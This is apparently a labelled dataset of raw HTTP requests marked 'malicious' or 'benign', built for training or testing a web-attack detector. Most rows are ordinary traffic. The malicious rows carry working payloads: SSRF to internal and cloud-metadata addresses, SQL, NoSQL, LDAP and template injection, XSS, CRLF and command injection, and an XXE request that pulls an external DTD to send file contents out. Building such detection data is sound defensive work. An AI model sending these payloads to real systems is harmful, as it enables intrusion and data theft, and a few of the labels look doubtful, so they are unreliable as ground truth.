label,text
malicious,"GET /resources/proxy?url=http://10.0.0.5:8080/admin/config HTTP/1.1
Host: online-retail-store.biz
User-Agent: Python-urllib/3.9
Accept: */*
Cache-Control: no-cache
Pragma: no-cache"
malicious,"POST /search LDAP HTTP/1.1
Host: enterprise-identity-hub.ai
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Accept-Language: en-US,en;q=0.8
Pragma: no-cache
Content-Length: 53

user_id=validuser%29%28objectClass%3D*%29%26attributes%3D*"
benign,"GET /api/v1/users?filter[type]=admin&filter[active]=true HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.86.0
Accept: application/json
X-Requested-With: XMLHttpRequest
Cache-Control: no-cache
Pragma: no-cache
Connection: close"
malicious,"POST /api/v3/profile/update HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 92

nickname=bigspender&address=123+Main+St&user_pref=active']; db.orders.drop(); //&newsletter=yes"
benign,"PUT /users/profile_pictures/user_9876543/bg_image.jpg HTTP/1.1
Host: photos-social-hub.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15
Content-Type: application/octet-stream
Content-Length: 180
Cookie: sessionid=8b765fed23a1d2e387c4f06182a; lang=fr-FR
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Connection: keep-alive

R0lGODlhPQBEAPeoAJosM////AwMDhISEkZGRra2st7e3ujp6WlpbOzs52dnYmJibOzs/Pz9nZ2ebm5gAAACH5BAAAAAAALAAAAAA9AEQAAAj+AAEIHEiwoMGDCBMqXMiwocOHECNKnEixosWLGDNq3Mixo8ePIEOKnXiRs6dOn0CPKmAkaKl6hyo0ZakTkyZMmTI8uWLGA68pnU6ZMo2aNKnMmzcuUKlTJs1aNMAAQKRGgwQIEGiQNAyoQKFEkWPBQsQKiTgwIDDxOSizeQHw4KA0e9QI8KEyi8z5cmFHAAeER0tGEl8aANCihQ4QcOHGAxoUrJkymUKFFkyZMnTZo0aMHTqzJs27dz48ePHjy5cwYJmTAEAOw=="
benign,"POST /ws/v1/InvoiceService HTTP/1.1
Host: billing-enterprise-solutions.biz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Type: application/soap+xml; charset=utf-8
Content-Length: 436
Accept: application/soap+xml, application/xml
Connection: keep-alive

<?xml version=""1.0"" encoding=""utf-8""?>
<soap:Envelope xmlns:soap=""http://www.w3.org/2003/05/soap-envelope"">
  <soap:Header/>
  <soap:Body>
    <GetInvoiceDetails xmlns=""http://billing-enterprise-solutions.biz/ws"">
      <InvoiceId>INV123456</InvoiceId>
      <Requestor>FinanceDept</Requestor>
    </GetInvoiceDetails>
  </soap:Body>
</soap:Envelope>"
malicious,"GET /search/%7B%7B%20self.__init__.__globals__.__builtins__.__import__(%22os%22).popen(%22df%20-h%22).read()%20%7D%7D/results HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cache-Control: no-cache
Pragma: no-cache
Connection: keep-alive"
benign,"DELETE /api/v1/notifications/002345 HTTP/1.1
Host: my-personal-blog-site.info
Authorization: Bearer token-88fjk2k4938dbfjs9393
Accept: application/json
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Via: 1.1 google
Connection: close"
malicious,"GET /redirector?target=data:text/html;base64,PHNjcmlwdD5hbGVydCgnUmVkaXJlY3RlZCEgWFNTJyk8L3NjcmlwdD4= HTTP/1.1
Host: data-analytics-server.ai
User-Agent: Python-urllib/3.9
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"POST /api/xml/createItem HTTP/1.1
Host: inventory-management.cloudstockhub.io
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.empLqjq7vuf_oAstplQF9MPvmVsk
Content-Type: application/xml
Accept: application/xml
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Length: 181
Connection: keep-alive

<?xml version=""1.0"" encoding=""UTF-8""?>
<item>
  <name>Ergonomic Office Chair</name>
  <category>Furniture</category>
  <price>149.99</price>
  <stock>23</stock>
  <description>Comfortable chair with lumbar support and adjustable armrests.</description>
</item>"
benign,"POST /auth/password/reset HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/json
Accept: application/json
User-Agent: curl/7.79.1
Content-Length: 49
Connection: close

{""email"":""linda.cho@my-personal-blog-site.info""}"
malicious,"POST /profile/save HTTP/1.1
Host: urban-art-gallery.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Origin: https://urban-art-gallery.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://urban-art-gallery.net/profile/edit
Content-Length: 65
Connection: keep-alive

user_bio=Contemporary+artist+%3C%21--%23InClUdE+vIrTuAl%3D%22%2Fetc%2Fhosts%22+--%3E"
benign,"POST /api/v1/oauth2/token HTTP/1.1
Host: trusted-auth-service.co
Content-Type: application/x-www-form-urlencoded
Content-Length: 122
Authorization: Basic dHJ1c3RlZEF1dGg6YWJjMTIzNA==
User-Agent: curl/7.88.1
Accept: application/json
Connection: close

grant_type=refresh_token&refresh_token=trs9282340928jdfsdfnsjf&client_id=trustedAuth&client_secret=abc1234&redirect_uri=https%3A%2F%2Ftrusted-auth-service.co%2Fcallback"
malicious,"POST /member/settings HTTP/1.1
Host: secure-data-exchange.cloud
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept-Language: en-US,en;q=0.6
Content-Length: 76

fullname=George+King&email_verified=true&role_id=1&internal_user_status=ACTIVE"
benign,"GET /developer/api/v3/accounts?filter[type]=admin&filter[active]=true HTTP/1.1
Host: devtools-openapi.org
Accept: application/json
Authorization: Token 8f74c65d62098723e041f9adc2f65421
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Connection: close"
malicious,"GET /search/users?filter%5Buser_id%5D%5B%24gt%5D=&filter%5Bstatus%5D=active HTTP/1.1
Host: global-multimedia-streaming.org
User-Agent: Wget/1.21.1
Accept: */*
Cache-Control: max-age=0
Connection: close"
benign,"GET /library/catalog/search?author=tolkien&author=asimov&format=ebook&language=english HTTP/1.1
Host: modern-library.systems
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.7
Via: 1.1 varnish
Connection: keep-alive"
benign,"GET /articles/featured?cmd=view_details&date=2024-06-10 HTTP/1.1
Host: global-news-daily.info
Accept: text/html,application/xhtml+xml
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: https://global-news-daily.info/
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15"
malicious,"GET /safe/redirect?next=http://security-update-center.net@pharm-site.biz/dashboard HTTP/1.1
Host: security-update-center.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate
Referer: https://security-update-center.net/alerts
Connection: keep-alive"
benign,"HEAD /api/v1/keepalive HTTP/1.1
Host: central-logging-api.cloud
User-Agent: python-urllib/3.11
Accept: text/plain, */*;q=0.8
Connection: keep-alive"
malicious,"GET /blog/article/view?id=1123 HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Cookie: PHPSESSID=xyz123abc456; tracking_id=xyz' OR IF(ASCII(SUBSTRING((SELECT /*!password*/ FROM users WHERE username='admin'),1,1))=0x61,SLEEP(5),0)#; theme=dark
Referer: https://community.game-dev-forum.org/blog
Upgrade-Insecure-Requests: 1"
malicious,"POST /v3/auth/redirect HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/json
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 260
Pragma: no-cache
Referer: https://community.game-dev-forum.org/login
Cookie: sid=abcde12345fghij67890

{""redirect_url"": ""/user/profile%0d%0aContent-Type:%20text/html%0d%0aLocation:%20http://evil-redirect.game-dev-forum.org%0d%0a%0d%0a<html><body>Redirecting...</body></html>""}"
malicious,"POST /app/user/settings/loadfile HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/json, text/plain, */*
Content-Type: application/json
Content-Length: 48
Origin: https://community.game-dev-forum.org
Connection: keep-alive

{""filePath"": ""C:\\Users\\Admin\\AppData\\Local\\Temp\\log.txt""}"
benign,"GET /news/local/latest HTTP/1.1
Host: citytimes-online.ai
Accept: text/html
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Cookie: last_visit_b64=eyJyZWdpb24iOiJUeXByZXN0b3duIiwgImRhdGUiOiIyMDIzLTA2LTI0In0=; prefs=light
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1"
benign,"GET /robots.txt HTTP/1.1
Host: eco-trends-platform.org
User-Agent: WebAnalyticsSpider/1.7 (+http://webanalytics.org/spider)
Accept: text/plain,application/xml;q=0.9
Referer: http://eco-trends-platform.org/home
Connection: keep-alive"
benign,"GET /api/v1/devices/status?region=us-east HTTP/1.1
Host: edge-control-net.io
X-Forwarded-For: 192.168.1.101
Accept: application/json
User-Agent: curl/7.85.0
Referer: https://app.edge-control-net.io/dashboard
Connection: close"
benign,"GET /healthcheck HTTP/1.1
Host: edge-cache-service.fastcontent.delivery
User-Agent: curl/7.64.1
Accept-Encoding: gzip
Connection: keep-alive"
benign,"OPTIONS /api/v1/sessions/aa77d93cc7/delete HTTP/1.1
Host: session-management.systems
Origin: https://app.online-learning-center.education
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: authorization
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: */*
Connection: keep-alive"
benign,"GET /swagger.json HTTP/1.1
Host: financial-transactions-api.cloud
Accept: application/json
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Mobile Safari/537.36
Accept-Encoding: br,gzip,deflate
Connection: keep-alive"
malicious,"GET /forums/thread/8742 HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 ""><img src=x onerror=eval(atob('YWxlcnQoIkJhZCBzY3JpcHQiKQ=='))>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Referer: https://community.game-dev-forum.org/forums
Upgrade-Insecure-Requests: 1
Connection: keep-alive"
benign,"POST /api/v2/photos/upload HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/8.2.1
Accept: */*
Content-Type: multipart/form-data; boundary=123456789abcdef
Content-Length: 352
Origin: https://api.cloud-data-services.ai
Cookie: session=plmn95286b3c89a9fa48a8b1043ef7902b
Connection: keep-alive

--123456789abcdef
Content-Disposition: form-data; name=""album_id""

74022
--123456789abcdef
Content-Disposition: form-data; name=""image_file""; filename=""vacation_beach.jpg""
Content-Type: image/jpeg

(simulated binary image data)
--123456789abcdef--"
benign,"GET /v1/alerts HTTP/1.1
Host: notify.techwatcher.cloud
App-Secret: 7ds92jm04cxqfLtWAK13rgBypohEZVMN
Accept: application/json
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept-Encoding: gzip
Via: 1.1 vegur
Connection: close"
malicious,"POST /api/v1/logentry HTTP/1.1
Host: exfiltrator.network-monitoring.cloud
Content-Type: application/json
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept-Encoding: gzip, deflate
Content-Length: 283
Connection: close

{""client_ip"": ""10.0.0.1"", ""event_details"": ""Access granted\"", \""auth_code\"": 200, \""username\"": \""superuser\"", \""access_level\"": true, \""meta\"": \""Auth success logged""}"
malicious,"POST /contact/send HTTP/1.1
Host: secure-feedback.contactservice.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
Content-Type: application/x-www-form-urlencoded
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate, br
Content-Length: 63

name=Michael%20Jones&message=Hello%0aid%0als%20-la%20%2Ftmp"
benign,"GET /events/2024/sustainability-conference HTTP/1.1
Host: eco-initiative.net
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html
Accept-Language: en-GB,en;q=0.5
DNT: 1
Connection: keep-alive"
malicious,"POST /xml/api/submit HTTP/1.1
Host: data-sync-warehouse.ai
User-Agent: curl/7.77.0
Accept: */*
Content-Type: application/xml
Content-Length: 298
Connection: keep-alive

<!DOCTYPE data [
  <!ENTITY % file SYSTEM ""file:///etc/hostname"">
  <!ENTITY % ext SYSTEM ""http://secure-dataflow-backend.biz/evil.dtd"">
  %ext;
  %send;
]>
<sync><value>&exfil;</value></sync>"
benign,"GET /api/tasks?assigned_user=jordan.smith&priority=medium&status=pending HTTP/1.1
Host: taskflow-workspaces.net
Accept: application/json
Authorization: ApiKey ZHJhZnQzcnQybW9ja19rZXk= 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Accept-Language: en-US,en;q=0.9"
benign,"POST /profile/image-upload HTTP/1.1
Host: socialconnect-media.app
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:91.0) Gecko/20100101 Firefox/91.0
Accept-Language: en-GB,en;q=0.9
Content-Length: 28
Connection: keep-alive
Cookie: sc_auth=842dc9d737dc399ed5872b2f276aefa1

imageData=&description=Holiday+avatar"
benign,"GET /profile/view?id=7325 HTTP/1.1
Host: creativephotographers-community.org
Connection: keep-alive
Accept: text/html,application/xhtml+xml
Accept-Language: en-GB,en;q=0.8
Cache-Control: max-age=0
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
benign,"GET /community/posts/recent?topic=game-development&callback=processData HTTP/1.1
Host: community.game-dev-forum.org
Accept: application/javascript
Connection: keep-alive
User-Agent: googlebot/2.1 (+http://www.google.com/bot.html)
Referer: https://community.game-dev-forum.org/
Accept-Language: en-US"
benign,"GET /api/v4/analytics/reports?reportPage=ZGF0YV9yYW5nZToxMDAwLTE1MDA=&parameters=eyJtZXRyaWNzIjpbImNsaWNrcyIsInZpZXdzIl19 HTTP/1.1
Host: insights-portal.io
Accept: application/json
User-Agent: python-requests/2.28.1
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
benign,"POST /checkout/shipping-address HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept: application/json, text/plain, */*
Connection: keep-alive
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Referer: https://online-retail-store.biz/cart/view
Cookie: sid=92d14cbc8d7f44219834293d9bf0c48f
Content-Length: 453

addressee=Kevin+Brown&company_name=&address_1=789+Broadway+Ave&address_2=Floor+3&city=Seattle&state=WA&postal_code=98101&country=US&phone=2065559357&email=kevin.brown%40mail.com&delivery_instructions=Leave+at+front+door&preferred_carrier=UPS&insurance=yes&gift_wrap=no&promo_code=&tax_exempt=false&confirmation_email=yes&save_address=true&address_nickname=Work&contact_method=email&delivery_timeframe=morning&alternate_phone=2065551987&special_requests=No+plastic+bags&billing_same_as_shipping=yes&authorization_token=AT02-72e8ea2422b7467fb9c145565d8c1f71"
benign,"GET /legacy/orders HTTP/1.1
Host: community.game-dev-forum.org
Accept: text/xml
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Mobile Safari/537.36
Authorization: Bearer qwertyuiop1234567890
Referer: https://community.game-dev-forum.org/dashboard
Connection: close"
malicious,"GET /process/download?format=jpeg&imageUrl=http%3A%2F%2Fuser-content-dl.cloud-media-storage.net%2Ffiles%2Fimage01.jpeg&imageUrl=http%3A%2F%2F169.254.169.254%2Fadmin%2Fnetwork HTTP/1.1
Host: user-content-dl.cloud-media-storage.net
User-Agent: Python-urllib/3.8
Accept-Language: en-US,en;q=0.8
Cache-Control: no-cache"
benign,"GET /blog/tech/podcast-recap-june HTTP/1.1
Host: wired-insights.io
Connection: keep-alive
Accept: text/html,application/xhtml+xml
Upgrade-Insecure-Requests: 1
Referer: https://wired-insights.io/blog/tech
Accept-Language: en-GB,en;q=0.8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15"
benign,"POST /account/security/notifications HTTP/1.1
Host: financial-dashboard-app.co
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Content-Type: application/json
Accept-Encoding: gzip, deflate, br
Content-Length: 117
DNT: 1
Cookie: financeSess=842a9f23065cdd3c23a2af8d4bfe3ce1

{""notificationEmails"":[""security-alerts@financial-dashboard-app.co"",""it-support@financial-dashboard-app.co""],""enabled"":true}"
benign,"GET /search?category=outdoor+gear&sort=popularity HTTP/1.1
Host: trailcrest-outfitters.biz
Connection: keep-alive
Accept: text/html
Accept-Language: en-US,en;q=0.5
Referer: https://trailcrest-outfitters.biz/
Cookie: session=012a34e5cc7dee566c28e51923284f5b; cart_session=aa5843a4237d1c8a
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
benign,"GET /api/v2/notifications?lastSeen=MjA2NDU3&pageToken=QUJDMTIzRFQ1Ng== HTTP/1.1
Host: notifications.delivery-solutions.io
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest
Connection: keep-alive"
benign,"GET /shop/api/v1/items/filter?data=%7B%22filter%22%3A%22active%22%7D HTTP/1.1
Host: marketplace-online.biz
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Language: en-GB,en;q=0.8
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Referer: https://marketplace-online.biz/shop
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9; preferred_lang=en-GB"
benign,"DELETE /chatrooms/public/1952/messages/8837 HTTP/1.1
Host: community.game-dev-forum.org
Authorization: Bearer api_key_7364f9d8321f
X-Confirm-Delete: true
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/602.4.8 (KHTML, like Gecko) Version/14.0.3 Safari/602.4.8
Accept-Language: fr-FR,fr;q=0.8,en-US;q=0.5,en;q=0.3
Connection: close"
benign,"POST /user/register HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/json
Accept: application/json
Origin: https://my-personal-blog-site.info
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.100 Safari/537.36
Content-Length: 179

{""username"":""ryan_henderson"",""email"":""ryan.henderson@personalblog.info"",""password"":""Zx6*Tp1qVv"",""profile"":{""bio"":""Love hiking, tech, and coffee."",""location"":""Portland, OR""},""newsletterSubscribed"":false}"
benign,"GET /fitness/tracker/stats?range=weekly HTTP/1.1
Host: fit-active-hub.io
Accept: application/json
Accept-Language: en-US,en;q=0.9
Accept-Encoding: br, gzip, deflate
Connection: keep-alive
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1
X-CSRF-Token: 1f2e3d4c5b6a7e8f9d0c"
benign,"GET /projects/../images/logo.png HTTP/1.1
Host: eco-sustainability-hub.ai
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept-Encoding: gzip, deflate
Connection: keep-alive
Accept-Language: en"
benign,"POST /photos/upload HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Mobile Safari/537.36
Accept: image/*,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: multipart/form-data; boundary=----MobileBoundary0987
Origin: https://online-retail-store.biz
Referer: https://online-retail-store.biz/user/uploads
Cookie: auth_key=0987asdcfghjklpoiuytrewq12345
Connection: keep-alive

------MobileBoundary0987
Content-Disposition: form-data; name=""caption""

Store window display update
------MobileBoundary0987
Content-Disposition: form-data; name=""image_file""; filename=""storefront_photo.jpg""
Content-Type: image/jpeg

(simulated binary image data)
------MobileBoundary0987--"
malicious,"POST /blog/article/view HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: text/plain
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Pragma: no-cache
Content-Length: 85

user%5Bemail%5D=sophia%40personal-blog.info&user%5Bis_admin%5D=1&user%5Bprofile%5D%5Bverified%5D=true&user%5Broles%5D%5B%5D=14"
malicious,"GET /search?q=security HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 <script>alert('LogViewerXSS')</script>
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
X-Requested-With: XMLHttpRequest
Connection: keep-alive"
benign,"PATCH /v2/api/users/2354/profile HTTP/1.1
Host: profiles.enterprise-workflow.biz
Authorization: Bearer mF_9.B5f-4.1JqM
Content-Type: application/json
Accept: application/json, text/plain
Cache-Control: no-cache
User-Agent: curl/7.85.0
Content-Length: 27
Connection: keep-alive

{""displayName"":""Marta V. Ruiz""}"
benign,"DELETE /api/v4/forum/threads/2849 HTTP/1.1
Host: community.game-dev-forum.org
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.abcdef.ghijkl
X-Confirm-Delete: true
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept: application/json
Referer: https://community.game-dev-forum.org/threads/2849
Cache-Control: no-cache"
benign,"POST /news/daily/2024/04/06/comment HTTP/1.1
Host: global-eco-watch.ai
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 106
Origin: https://global-eco-watch.ai
Referer: https://global-eco-watch.ai/news/daily/2024/04/06
Cookie: auth_token=c93f75e2a8b647a59fa6e0b7eef0eedf; csrf=84e621b080d84a52
Connection: keep-alive

author_name=&comment_text=Great+article+on+the+renewable+energy+initiatives.+Keep+it+up!&csrf=84e621b080d84a52"
benign,"PUT /api/projects/315/update HTTP/1.1
Host: project-management-suite.com
Authorization: Bearer mF_9.B5f-4.1JqM
Accept: application/xml
Content-Type: application/xml
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept-Encoding: gzip, deflate
Content-Length: 155

<Project><title>Website Redesign</title><deadline>2024-08-15</deadline><status>in_progress</status><priority>high</priority></Project>"
benign,"POST /session/end HTTP/1.1
Host: edu-course-platform.edu
Connection: close
Content-Type: application/x-www-form-urlencoded
Referer: https://edu-course-platform.edu/user/dashboard
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/114.0.1823.41
Cookie: sess=afd9b771331e9c39e6c4bcf7
Accept-Encoding: gzip, deflate
Content-Length: 35

csrf_token=3d2a69b1f4e8f9ca7d571278"
benign,"GET /assets/css/responsive.min.css HTTP/1.1
Host: regional-weather-updates.net
Accept: text/css,*/*;q=0.1
Referer: https://regional-weather-updates.net/home/dashboard.html
Connection: keep-alive
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
benign,"GET /search/%D8%A7%D9%84%D8%A3%D8%AD%D8%AF%D8%A7%D8%AB HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: application/json
Accept-Language: ar,en-US;q=0.8,en;q=0.7
Connection: keep-alive
X-Requested-With: XMLHttpRequest"
benign,"PUT /api/v1/devices/0415 HTTP/1.1
Host: iot-management-hub.org
Authorization: Bearer eyJh...FDJn""
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:110.0) Gecko/20100101 Firefox/110.0
Content-Length: 129

{""id"":415,""device_name"":""weather-sensor-15"",""location"":""Rooftop"",""status"":""active"",""metrics_enabled"":true,""sampling_rate"":60}"
